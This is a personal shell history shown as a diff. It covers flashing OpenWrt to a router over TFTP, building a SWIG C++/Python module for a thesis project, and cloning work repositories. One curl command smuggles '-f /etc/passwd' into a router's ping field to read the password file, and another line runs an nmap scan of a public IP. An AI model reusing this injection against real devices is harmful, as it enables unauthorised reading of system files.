+ 1074  sudo launchctl load -F /System/Library/LaunchDaemons/tftp.plist
+ 1075  netstat -atp UDP | grep tftp\n
+ 1076  cd Downloads
+ 1077  clear
+ 1078  ls
+ 1079  mv openwrt-22.03.0-ramips-mt76x8-tplink_tl-wr840n-v4-squashfs-tftp-recovery.bin /private/tftpboot/tp_recovery.bin
+ 1080  sudo cp openwrt-22.03.0-ramips-mt76x8-tplink_tl-wr840n-v4-squashfs-tftp-recovery.bin /private/tftpboot/tp_recovery.bin
+ 1081  cd /private/tftpboot
+ 1082  clrar
+ 1083  clear
+ 1084  ls
+ 1085  ll
+ 1086  sudo chmod -R 766 tp_recovery.bin
+ 1087  cd ~
+ 1088  sudo chmod -R 766 /private/tftpboot
+ 1089  tcpdump --help
+ 1090  tcpdump tcp -i en-
+ 1091  tcpdump tcp -i en0
+ 1092  netstat | grep tftp
+ 1093  tcpdump udp -i en0
+ 1094  ls /private/tftpboot
+ 1095  sudo ls /private/tftpboot
+ 1096  sudo ll /private/tftpboot/
+ 1097  sudo ls -la /private/tftpboot/
+ 1098  tcpdump udp -i en0
+ 1099  ufw --help
+ 1100  tcpdump udp -i en0 | grep tftp
+ 1101  tcpdump udp -i en0
+ 1102  dnsmasq
+ 1103  sudo launchctl load -F /System/Library/LaunchDaemons/tftp.plist 
+ 1104  netstat -an | fgrep \*.69
+ 1105  tftp localhost
+ 1106  sudo ls -la /private/tftpboot
+ 1107  ip a
+ 1108  ifconfig
+ 1109  tcpdump udp -i en0
+ 1110  ufw
+ 1111  sudo ufw
+ 1112  sudo ls -la /private/tftpboot
+ 1113  sudo chown nobody:nogroup -R /private/tftpboot
+ 1114  sudo chown nobody:nogroup  /private/tftpboot
+ 1115  sudo ls -la /private/tftpboot
+ 1116  sudo chown nobody:nogroup  /private/tftpboot/tp_recovery.bin
+ 1117  tail /var/log/system.log
+ 1118  tail /var/log/system.log -f
+ 1119  tail -f /var/log/system.log
+ 1120  clear
+ 1121  sudo chmod 777 -R /private/tftpboot
+ 1122  sudo launchctl unload -F /System/Library/LaunchDaemons/tftp.plist 
+ 1123  netstat -an | fgrep \*.69
+ 1124  cler
+ 1125  clear
+ 1126  brew install dnsmasq
+ 1127  dnsmasq --help
+ 1128  dnsmasq -i en0 -p 0 -z --enable-tftp --tftp-root /tmp
+ 1129  sudo dnsmasq -i en0 -p 0 -z --enable-tftp --tftp-root /tmp
+ 1130  netstat -an | fgrep \*.69
+ 1131  sudo cp /private/tftpboot/tp_recovery.bin /tmp
+ 1132  ls /tmp
+ 1133  cd /tmp
+ 1134  ll
+ 1135  pwd
+ 1136  sudo dnsmasq -i en0 -p 0 -z --enable-tftp --tftp-root /tmp
+ 1137  netstat -an | fgrep \*.69
+ 1138  netstat | grep tftp
+ 1139  ps aux | grep dnsmasq
+ 1140  kill 80701
+ 1141  killall dnsmasq
+ 1142  sudo killall dnsmasq
+ 1143  ps aux | grep dnsmasq
+ 1144  netstat -lunp | grep 69 
+ 1145  netstat | grep 69 
+ 1146  netstat -nlvp | grep 69 
+ 1147  lsof -i tcp/80
+ 1148  lsof -i tcp 80
+ 1149  lsof -i 80
+ 1150  lsof -i tcp
+ 1151  lsof -i 69
+ 1152  lsof -i :69
+ 1153  lsof -i :80
+ 1154  lsof -i :69
+ 1155  sudo dnsmasq -i en0 -p 0 -z --enable-tftp --tftp-root /tmp
+ 1156  lsof -i :69
+ 1157  lsof 
+ 1158  lsof | grep 69
+ 1159  lsof -i tcp| grep 69
+ 1160  lsof -i tcp
+ 1161  lsof -i :69
+ 1162  netstat -antup
+ 1163  lsof -i
+ 1164  ifconfig
+ 1165  clea
+ 1166  clear
+ 1167  $ netstat -an | fgrep \*.69    \n
+ 1168  $ netstat -an | grep \*.69\n
+ 1169  netstat -an | grep \*.69\n
+ 1170  netstat -an | grep \*.80\n
+ 1171  killall dnsmasq
+ 1172  sudo killall dnsmasq
+ 1173  clear
+ 1174  sudo launchctl load -F /System/Library/LaunchDaemons/tftp.plist 
+ 1175  netstat -an | grep \*.80\n
+ 1176  netstat -an | grep \*.69\n
+ 1177  tftp
+ 1178  tftp 192.168.0.66
+ 1179  ls
+ 1180  ll
+ 1181  rm -r tp_recovery.bin
+ 1182  ll
+ 1183  rm -r tp_recovery.bin
+ 1184  clear
+ 1185  exit
+ 1186  nano /System/Library/LaunchDaemons/tftp.plist\n
+ 1187  sudo chmod 777 /private/tftpboot
+ 1188  sudo launchctl unload /System/Library/LaunchDaemons/tftp.plist\n
+ 1189  sudo launchctl load /System/Library/LaunchDaemons/tftp.plist\n
+ 1190  sudo launchctl load -F /System/Library/LaunchDaemons/tftp.plist\n
+ 1191  clear
+ 1192  sudo launchctl unload /System/Library/LaunchDaemons/tftp.plist\n
+ 1193  exit
+ 1194  brew install --cask tftpserver\n
+ 1195  brew install tftpserver\n
+ 1196  nmap -sC -sV 177.141.139.229
+ 1197  tor
+ 1198  c lear
+ 1199  clear
+ 1200  ls
+ 1201  code .
+ 1202  gcc
+ 1203  gpp
+ 1204  g++ 
+ 1205  g++  --help
+ 1206  which g++
+ 1207  code .
+ 1208  brew install swig
+ 1209  which swig
+ 1210  cd /opt/homebrew/bin/swig\n
+ 1211  cd /opt/homebrew/bin\n
+ 1212  ll
+ 1213  cd ../Cellar/swig/4.0.2/bin/
+ 1214  ll
+ 1215  cd ..
+ 1216  ll
+ 1217  cd ..
+ 1218  ll
+ 1219  cd 4.0.2
+ 1220  ls
+ 1221  ll
+ 1222  cd share
+ 1223  ls
+ 1224  cd swig/4.0.2/python
+ 1225  ls
+ 1226  cd ..
+ 1227  ll
+ 1228  cd 4.0.2
+ 1229  ls
+ 1230  pwd
+ 1231  cd brain
+ 1232  clear
+ 1233  ls
+ 1234  make check
+ 1235  which python3
+ 1236  make build
+ 1237  python-config
+ 1238  make build
+ 1239  python-config --includes
+ 1240  python-config --libs
+ 1241  python-config --ldflags
+ 1242  make build
+ 1243  python-config --includes
+ 1244  python-config --libs
+ 1245  python-config --ldflags
+ 1246  make build
+ 1247  python-config --ldflags
+ 1248  make build
+ 1249  g++ -v
+ 1250  make build
+ 1251  python-config -v
+ 1252  python-config --prefixes
+ 1253  python-config --prefix
+ 1254  python-config --cflags
+ 1255  make build
+ 1256  python-config --cflags
+ 1257  make build
+ 1258  clang Brain.cpp
+ 1259  clang Brain.cpp -v
+ 1260  clang++ Brain.cpp -v
+ 1261  clang++ Brain.cpp -o a.out
+ 1262  make build
+ 1263  xcrun --show-sdk-path
+ 1264  make build
+ 1265  g++ -c Brain.cpp -o Brain.so
+ 1266  cd ..
+ 1267  python teste.py
+ 1268  g++ -c -o brain/Brain.o brain/Brain.o
+ 1269  g++ -c -o brain/Brain.o brain/Brain.cpp
+ 1270  gcc -shared -o brain/Brain.so brain/Brain.o
+ 1271  python teste.py
+ 1272  g++ -c -o brain/Brain.o brain/Brain.cpp
+ 1273  gcc -shared -o brain/Brain.so brain/Brain.o
+ 1274  python teste.py
+ 1275  cd brain
+ 1276  swig -c++ -python Brain.i
+ 1277  clear
+ 1278  swig -c++ -python Brain.i
+ 1279  g++ -02 -fPIC -c Brain.cpp
+ 1280  g++ -o2 -fPIC -c Brain.cpp
+ 1281  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8
+ 1282  g++ -shared Brain.o Brain_wrap.o -o Brain.so
+ 1283  g++ -o2 -fPIC -c Brain_wrap.cxx
+ 1284  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/cpython/
+ 1285  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/internal/
+ 1286  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1287  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/
+ 1288  g++ -o2 -fPIC -c Brain_wrap.cxx -L/Users/felipe/.asdf/installs/python/3.8.13/
+ 1289  g++ -o2 -fPIC -c Brain_wrap.cxx -L /Users/felipe/.asdf/installs/python/3.8.13/
+ 1290  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include
+ 1291  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1292  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/ -L/Users/felipe/.asdf/installs/python/3.8.13/lib/python3.8/
+ 1293  g++ -o2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/ -L/Users/felipe/.asdf/installs/python/3.8.13/lib/python3.8/ -v
+ 1294  swig -c++ -python -o Brain.cpp -intefarce Brain Brain.i
+ 1295  swig -c++ -python -o Brain.cpp -interface Brain Brain.i
+ 1296  swig -c++ -python -o Brain.cpp -interface Brain.i
+ 1297  swig -c++ -python -o Brain.cpp -interface Brain Brain.i
+ 1298  clang++ -arch arm64  -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/ -L/Users/felipe/.asdf/installs/python/3.8.13/lib/python3.8/ -shared -o Brain.so
+ 1299  clang++ -arch arm64  -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/ Brain.cpp -L/Users/felipe/.asdf/installs/python/3.8.13/lib/python3.8/ -shared -o Brain.so
+ 1300  clang++ -arch arm64  -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/ Brain.cpp /Users/felipe/.asdf/installs/python/3.8.13/lib/python3.8/ -shared -o Brain.so
+ 1301  swig -c++ -python Brain.i
+ 1302  g++ -O2 -fPIC -c Brain.cpp
+ 1303  g++ -o2 -fPIC -c Brain.cpp
+ 1304  g++ -o2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1305  g++ -o2 -fPIC -c Brain_wrap.OB -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1306  clear
+ 1307  exit
+ 1308  g++ -o2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1309  cd brain
+ 1310  g++ -o2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1311  g++ -O2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1312  swig -c++ -python Brain.i
+ 1313  g++ -O2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1314  g++ -O2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1315  g++ -shared Brain.o Brain_wrap.o -o Brain.so
+ 1316  swig -c++ -python -py3 -builtin Brain.i
+ 1317  g++ -O2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1318  g++ -O2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1319  g++ -shared Brain.o Brain_wrap.o -o Brain.so
+ 1320  swig -c++ -python -py3 -builtin -relativeimport -O -interface Brain.i
+ 1321  swig -c++ -python -py3 -builtin -O -interface Brain.i
+ 1322  swig -c++ -python -py3 -builtin -interface Brain.i
+ 1323  swig -c++ -python -py3 -interface Brain.i
+ 1324  swig -c++ -python -py3 -builtin -relativeimport -O Brain.i
+ 1325  g++ -O2 -fPIC -c Brain.cpp -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1326  g++ -O2 -fPIC -c Brain_wrap.cxx -I/Users/felipe/.asdf/installs/python/3.8.13/include/python3.8/
+ 1327  g++ -lpython -dynamiclib Brain.o Brain_wrap.o -o Brain.so
+ 1328  g++ -dynamiclib Brain.o Brain_wrap.o -o Brain.so
+ 1329  clear
+ 1330  swig -c++ -python -py3 -builtin -interface Brain.i
+ 1331  swig -c++ -python -py3 -builtin Brain.i
+ 1332  python setup.py build_ext -inplace
+ 1333  clear
+ 1334  python setup.py build_ext -inplace
+ 1335  swig -c++ -python -py3 Brain.i
+ 1336  python setup.py build_ext -inplace
+ 1337  make 
+ 1338  python setup.py build_ext -inplace
+ 1339  make 
+ 1340  ./configure
+ 1341  autocong
+ 1342  autoconf
+ 1343  configure
+ 1344  aclocal
+ 1345  code .
+ 1346  make ./brain
+ 1347  cd ..
+ 1348  ./brain make 
+ 1349  make brain
+ 1350  cd brain
+ 1351  make 
+ 1352  cd brain
+ 1353  make 
+ 1354  cd brain
+ 1355  make 
+ 1356  chmod +x automake.sh
+ 1357  clear
+ 1358  python3 -m venv venv
+ 1359  source venv/bin/activate
+ 1360  clear
+ 1361  ls
+ 1362  pip install -r req
+ 1363  rm -r venv
+ 1364  clear
+ 1365  cd ..
+ 1366  python3 -m venv venv
+ 1367  source venv/bin/activate
+ 1368  pip install -r requirements.txt
+ 1369  clear
+ 1370  python -V
+ 1371  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1372  /Users/felipe/Desktop/projetos/tcc/venv/bin/python -m pip install -U autopep8
+ 1373  pip install -e
+ 1374  pip install -e .
+ 1375  make
+ 1376  python setup.py install
+ 1377  clear
+ 1378  python main.py
+ 1379  cd brain
+ 1380  clear
+ 1381  ls
+ 1382  make
+ 1383  cd .
+ 1384  cd ..
+ 1385  clear
+ 1386  ls
+ 1387  python main.py
+ 1388  cd brain
+ 1389  make
+ 1390  cd ..
+ 1391  python main.py
+ 1392  cd brain
+ 1393  make
+ 1394  cd ..
+ 1395  python main.py
+ 1396  cd brain
+ 1397  python setup.py install
+ 1398  python setup.py build_ext -inplace
+ 1399  make
+ 1400  make build
+ 1401  swig -python -py3 -c++ Brain.i
+ 1402  python setup.py build_ext
+ 1403  make build
+ 1404  python setup.py
+ 1405  python setup.py --help
+ 1406  python-config --cflags
+ 1407  clear
+ 1408  swig -python -py3 -c++ Brain.i
+ 1409  clear
+ 1410  ls
+ 1411  cd .
+ 1412  cd ..
+ 1413  clear
+ 1414  python main.py
+ 1415  clear
+ 1416  ls
+ 1417  clear
+ 1418  python main.py
+ 1419  swig -python -c++ Brain.i
+ 1420  cd brain
+ 1421  swig -python -c++ Brain.i
+ 1422  python ../main.py
+ 1423  swig -python -c++ Brain.i
+ 1424  python ../main.py
+ 1425  swig -python -c++ Brain.i
+ 1426  swig -python -py3 -c++ Brain.i
+ 1427  python ../main.py
+ 1428  python main.py
+ 1429  make
+ 1430  make build
+ 1431  swig -c++ -python -py3 Brain.i
+ 1432  python setup.py build_ext -inplace
+ 1433  clear
+ 1434  python main.py
+ 1435  swig -c++ -python -py3 Brain.i
+ 1436  python setup.py build_ext -inplace
+ 1437  python main.py
+ 1438  python setup.py build_ext --inplace
+ 1439  swig -c++ -python -py3 Brain.i
+ 1440  python setup.py build_ext --inplace
+ 1441  clear
+ 1442  python setup.py build_ext --inplace
+ 1443  python setup.py build
+ 1444  python setup.py --help
+ 1445  python setup.py build --help
+ 1446  python setup.py build_ext --help
+ 1447  python setup.py build_ext --inplace --compiler clang++
+ 1448  python setup.py build_ext --inplace --compiler g++
+ 1449  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1450  which clang++
+ 1451  python setup.py build_ext --inplace --compiler=/usr/bin/clang++
+ 1452  python setup.py build_ext --compiler=/usr/bin/clang++ -i
+ 1453  python setup.py build_ext -i
+ 1454  python main.py
+ 1455  python setup.py build_ext -i
+ 1456  python main.py
+ 1457  pip install .
+ 1458  pip install wheel
+ 1459  pip install .
+ 1460  python main.py
+ 1461  clear
+ 1462  pip install .
+ 1463  python main.py
+ 1464  pip install .
+ 1465  python main.py
+ 1466  make update
+ 1467  make build
+ 1468  clear
+ 1469  make build
+ 1470  clear
+ 1471  python setup.py build_ext --help
+ 1472  python setup.py build_ext --swig-cpp
+ 1473  python main.py
+ 1474  make build
+ 1475  swig -c++ -python -py3 Brain.i
+ 1476  \tpython setup.py build_ext --inplace 
+ 1477  swig -c++ -python -py3 Brain.i
+ 1478  \tpython setup.py build_ext --inplace 
+ 1479  swig -c++ -python -py3 Brain.i
+ 1480  \tpython setup.py build_ext --inplace 
+ 1481  swig -c++ -python -py3 Brain.i
+ 1482  \tpython setup.py build_ext --inplace 
+ 1483  swig -c++ -python -py3 Brain.i
+ 1484  \tpython setup.py build_ext --inplace 
+ 1485  swig -c++ -python -py3 Brain.i
+ 1486  \tpython setup.py build_ext --inplace 
+ 1487  python setup.py build_ext --swig-cpp
+ 1488  python main.py
+ 1489  python setup.py build_ext --swig-cpp
+ 1490  python main.py
+ 1491  python setup.py build_ext --swig-cpp
+ 1492  python main.py
+ 1493  python setup.py build_ext --swig-cpp
+ 1494  python main.py
+ 1495  python setup.py build_ext --swig-cpp --inplace
+ 1496  python main.py
+ 1497  python setup.py build_ext --swig-cpp --inplace
+ 1498  python main.py
+ 1499  make build_ext
+ 1500  python main.py
+ 1501  cd ..
+ 1502  python main.py
+ 1503  xit
+ 1504  exit
+ 1505  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1506  clear
+ 1507  git clone https://github.com/kylemath/DeepEEG/\n
+ 1508  cd DeepEEG
+ 1509  clear
+ 1510  ./install.sh
+ 1511  clear
+ 1512  ls
+ 1513  source ../venv/bin/activate
+ 1514  clear
+ 1515  ./install.sh
+ 1516  pip install numpy
+ 1517  ./install.sh
+ 1518  cd ..
+ 1519  clear
+ 1520  cd rede_neural
+ 1521  pip install -r requirements.txt
+ 1522  python -V
+ 1523  pip -v
+ 1524  pip --version
+ 1525  pip install pip -u
+ 1526  pip install -u pip
+ 1527  pip install --upgrade pip
+ 1528  clear
+ 1529  pip install tensorflow
+ 1530  pip install apple tensorflow-deps
+ 1531  pip install tensorflow-deps
+ 1532  pip install tensorflow-macos
+ 1533  pip install -r requirements.txt
+ 1534  pip install tensorflow-metal
+ 1535  pip install -r requirements.txt --force-reinstall
+ 1536  tor
+ 1537  exit
+ 1538  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1539  clear
+ 1540  omz update
+ 1541  clear
+ 1542  ls
+ 1543  cd rede_neural
+ 1544  flake8 .
+ 1545  cd rede_neural
+ 1546  flake8 .
+ 1547  clear
+ 1548  flake8 .
+ 1549  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1550  source venv/bin/activate
+ 1551  cleaf
+ 1552  clear
+ 1553  pip install -r rede_neural/requirements.txt
+ 1554  clear
+ 1555  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1556  flake8 .
+ 1557  clear
+ 1558  cd rede_neural
+ 1559  flake8 .
+ 1560  exit
+ 1561  xit
+ 1562  exit
+ 1563  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1564  cd rede_neural/tests
+ 1565  python load_data_teste.py
+ 1566  cd ..
+ 1567  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1568  ls
+ 1569  cd rede_neural
+ 1570  ls
+ 1571  clear
+ 1572  python load_data_teste.py
+ 1573  clear
+ 1574  python load_data_teste.py
+ 1575  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1576  exit
+ 1577  clear
+ 1578  ls
+ 1579  python load_data_teste.py
+ 1580  clear
+ 1581  python load_data_teste.py
+ 1582  clear
+ 1583  python load_data_teste.py
+ 1584  ls
+ 1585  cd testes
+ 1586  ls
+ 1587  python load_data_teste.py
+ 1588  clear
+ 1589  ls
+ 1590  ll
+ 1591  clear
+ 1592  python load_data_teste.py
+ 1593  clear
+ 1594  ls
+ 1595  python load_data_teste.py
+ 1596  clear
+ 1597  python load_data_teste.py
+ 1598  clear
+ 1599  python load_data_teste.py
+ 1600  cd ../..
+ 1601  cd tcc
+ 1602  clear
+ 1603  ls
+ 1604  cd testes
+ 1605  clear
+ 1606  ls
+ 1607  python load_data_teste.py
+ 1608  clear
+ 1609  python load_data_teste.py
+ 1610  clear
+ 1611  python load_data_teste.py
+ 1612  clear
+ 1613  python load_data_teste.py
+ 1614  cd ..
+ 1615  cd testes
+ 1616  clea
+ 1617  clear
+ 1618  ls
+ 1619  python load_data_teste.py
+ 1620  clear
+ 1621  python load_data_teste.py
+ 1622  cd ..
+ 1623  python load_data_teste.py
+ 1624  cd rede_neural
+ 1625  python load_data_teste.py
+ 1626  python pre_processamento_teste.py
+ 1627  \tpython setup.py build_ext --inplace 
+ 1628  python pre_processamento_teste.py
+ 1629  cd ..
+ 1630  clear
+ 1631  ls
+ 1632  git init 
+ 1633  brew install git 
+ 1634  xcode-select --reset
+ 1635  sudo xcode-select --reset
+ 1636  git init
+ 1637  git add 
+ 1638  git add  .
+ 1639  git commit -m "initial commit"
+ 1640  clear
+ 1641  git remote add origin git@github.com:fexd12/tcc_sensor_neural.git\ngit branch -M main\ngit push -u origin main
+ 1642  git add ,
+ 1643  git add README.md
+ 1644  git commit -m "setting readme \n""
+ 1645  git commit -m "setting readme"
+ 1646  git push 
+ 1647  exit
+ 1648  ping 192.168.0.141
+ 1649  exi
+ 1650  exit
+ 1651  traceroute 1.1.1.1
+ 1652  traceroute 8.8.8.8
+ 1653  ping 169.254.25.17\t
+ 1654  ping 177.141.136.1\t
+ 1655  /Applications/Bitwarden.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/Electron\ Framework ; exit;
+ 1656  ls
+ 1657  cd ..
+ 1658  ls
+ 1659  cd ..
+ 1660  ls
+ 1661  cd /
+ 1662  ls
+ 1663  cd Volumes
+ 1664  ls
+ 1665  cd ..
+ 1666  cdl
+ 1667  ls
+ 1668  clear
+ 1669  ls
+ 1670  exit
+ 1671  xit
+ 1672  exit
+ 1673  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1674  ll
+ 1675  cd rede_neural
+ 1676  ls
+ 1677  clear
+ 1678  ls
+ 1679  python load_data_teste.py
+ 1680  clear
+ 1681  python load_data_teste.py
+ 1682  python pre_processamento_teste.py
+ 1683  ~
+ 1684  clear
+ 1685  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1686  cd rede_neural
+ 1687  python pre_processamento_teste.py
+ 1688  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1689  cd rede_neural
+ 1690  python load_data_teste.py
+ 1691  cd rede_neural
+ 1692  python load_data_teste.py
+ 1693  cd rede_neural
+ 1694  python load_data_teste.py
+ 1695  cd rede_neural
+ 1696  python load_data_teste.py
+ 1697  python pre_processamento_teste.py
+ 1698  traceroute 1.1.1.1
+ 1699  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1700  cd rede_neural
+ 1701  clear
+ 1702  python pre_processamento
+ 1703  python pre_processamento.py
+ 1704  python pre_processamento_teste.py
+ 1705  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1706  python pre_processamento_teste.py
+ 1707  curl 'http://192.168.15.1/cgi-bin/device-management-utilities-internet.cgi' \\n  -H 'Accept: text/html, */*; q=0.01' \\n  -H 'Accept-Language: en-US,en' \\n  -H 'Connection: keep-alive' \\n  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\n  -H 'Cookie: COOKIE_SESSION_KEY=28a5f66e1d6012b79ed356d86710934b' \\n  -H 'Origin: http://192.168.15.1' \\n  -H 'Referer: http://192.168.15.1/cgi-bin/sophia_index.cgi' \\n  -H 'Sec-GPC: 1' \\n  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' \\n  -H 'X-Requested-With: XMLHttpRequest' \\n  --data-raw 'wanPVCFlag=0&PINGFlag=1&pingIPAddr=-f+/etc/passwd&pingNUM=4' \\n  --compressed
+ 1708  ckear
+ 1709  ip a
+ 1710  ipconfig
+ 1711  ifconfig
+ 1712  ping 10.135.154.`13
+ 1713  ping 10.135.154.13
+ 1714  ip a
+ 1715  echo "myuser:$(echo 'mypassword' | openssl passwd -6 -stdin)" > userconf\n
+ 1716  openssl
+ 1717  openssl passwd
+ 1718  openssl passwd -h
+ 1719  traceroute 1.1.1.1
+ 1720  \tip a
+ 1721  ipconfig
+ 1722  ifconfig
+ 1723  clear
+ 1724  ifconfig
+ 1725  exit
+ 1726  omz update
+ 1727  clear
+ 1728  ls
+ 1729  traceroute
+ 1730  traceroute 8.8.8.8
+ 1731  ls -la
+ 1732  sudo chmod 600 id_ed25519_nic
+ 1733  ll
+ 1734  ls -lah
+ 1735  sudo chmod 644 id_ed25519_nic.pub
+ 1736  ls
+ 1737  ll
+ 1738  exit
+ 1739  sudo nano /etc/pam.d/sudo
+ 1740  sudo man sudo
+ 1741  exit
+ 1742  sudo man sudo
+ 1743  exit
+ 1744  ip a
+ 1745  ipconfig
+ 1746  ifconfig
+ 1747  exit
+ 1748  ifconfig
+ 1749  exit
+ 1750  clear
+ 1751  ls
+ 1752  ls\\ncd ~
+ 1753  ls
+ 1754  cd  ~/.ssh/
+ 1755  ls
+ 1756  ls -la
+ 1757  sudo nano .config
+ 1758  ls
+ 1759  ll
+ 1760  git clone ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git
+ 1761  sudo nano .config
+ 1762  git clone ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git
+ 1763  sudo nano .config
+ 1764  mv .config config
+ 1765  git clone ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git
+ 1766  clear
+ 1767  ls
+ 1768  ll
+ 1769  sudo chown felipe
+ 1770  sudo chown felipe config
+ 1771  ll
+ 1772  clear
+ 1773  cd ~/Desktop/projetos
+ 1774  ls
+ 1775  c
+ 1776  clear
+ 1777  ls
+ 1778  cd nic
+ 1779  ls
+ 1780  ll
+ 1781  git clone ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git
+ 1782  ls
+ 1783  nano config
+ 1784  git clone ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git
+ 1785  nano config
+ 1786  git clone ssh://git@nic_ssh_connection/swfron/as-measurements-webapp.git
+ 1787  nano config
+ 1788  ll
+ 1789  nano config
+ 1790  git clone ssh://git@nic_ssh_connection/swfron/as-measurements-webapp.git
+ 1791  git clone ssh://git@nic_ssh_connection/swfron/as-measurements-webapp.git -p 7999
+ 1792  nano config
+ 1793  git clone ssh://git@nic_ssh_connection/swfron/as-measurements-webapp.git
+ 1794  cd as-measurements-webapp
+ 1795  ls
+ 1796  clear
+ 1797  ls
+ 1798  node -v
+ 1799  asdf install nodejs 12.22.12
+ 1800  git clone ssh://git@code.ceptro.br:7999/swfron/pas-ui-study.git
+ 1801  git clone ssh://git@code.ceptro.br:7999/swfron/isp-user-portal.git
+ 1802  ls
+ 1803  nano config
+ 1804  git clone ssh://git@code.ceptro.br:7999/swfron/isp-user-portal.git
+ 1805  git clone ssh://git@code.ceptro.br:7999/swfron/pas-ui-study.git
+ 1806  clear
+ 1807  exit
+ 1808  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1809  cd rede_neural
+ 1810  ls
+ 1811  python pre_processamento_teste.py
+ 1812  pip install -r requirements.txt
+ 1813  asdf install nodejs 12.22.12
+ 1814  asdf current python 2.7
+ 1815  asdf global python 3.8.13
+ 1816  asdf install nodejs 12.22.12
+ 1817  asdf global python 3.8.13
+ 1818  python -V
+ 1819  clear
+ 1820  ls
+ 1821  clear
+ 1822  asdf local python 2.7
+ 1823  asdf install nodejs 12.22.12
+ 1824  git submodule init webapp-commons 
+ 1825  clear
+ 1826  ls
+ 1827  git submodule update --remote 
+ 1828  asdf global nodejs 12.22.12
+ 1829  node -v
+ 1830  clear
+ 1831  ls
+ 1832  npm 
+ 1833  npm i -g yarn
+ 1834  yarn 
+ 1835  exit
+ 1836  cd Desktop/projetos/nic/as-measurements-webapp
+ 1837  clear
+ 1838  ls
+ 1839  yarn 
+ 1840  clear
+ 1841  asdf install nodejs 14.20.1
+ 1842  asdf uninstall nodejs 12.22.12
+ 1843  clear
+ 1844  asdf global nodejs 14.20.1
+ 1845  npm i -g yarn
+ 1846  clear
+ 1847  yarn 
+ 1848  python -v
+ 1849  python -V
+ 1850  asdf global python 3.8.13
+ 1851  yarn 
+ 1852  exit
+ 1853  git config --global pull.rebase false
+ 1854  lear
+ 1855  cd webapp-commons
+ 1856  git pull
+ 1857  cd Desktop/projetos
+ 1858  ls
+ 1859  cd nic
+ 1860  ls
+ 1861  clear
+ 1862  ls
+ 1863  git clone ssh://git@code.ceptro.br:7999/swfron/as-simetas-webapp.git --recursive
+ 1864  clear
+ 1865  cd as-simetas-webapp
+ 1866  code .
+ 1867  exit
+ 1868  yarn 
+ 1869  cd Desktop/projetos/nic/pas-ui-study
+ 1870  ls
+ 1871  asdf local nodejs 18.7.0
+ 1872  npm i 
+ 1873  cat README.md
+ 1874  npm install --prefix dashboard-create-react-app\n
+ 1875  npm i
+ 1876  clear
+ 1877  npm tun dev
+ 1878  npm run dev
+ 1879  asdf install nodejs 16.18.0
+ 1880  asdf local nodejs 16.18.0
+ 1881  clear
+ 1882  ls
+ 1883  rm -rf node_modules
+ 1884  clear
+ 1885  npm install --prefix dashboard-create-react-app\n
+ 1886  npm i
+ 1887  npm run dev
+ 1888  exit
+ 1889  yarn 
+ 1890  node -v
+ 1891  sharp Prebuilt li
+ 1892  brew install vip
+ 1893  brew install vips
+ 1894  xcode-select --install
+ 1895  sudo xcode-select --install
+ 1896  brew install vips
+ 1897  xcode-select
+ 1898  xcode-select --install
+ 1899  brew install vips
+ 1900  yarn 
+ 1901  yarn workspace webapp run develop:lab
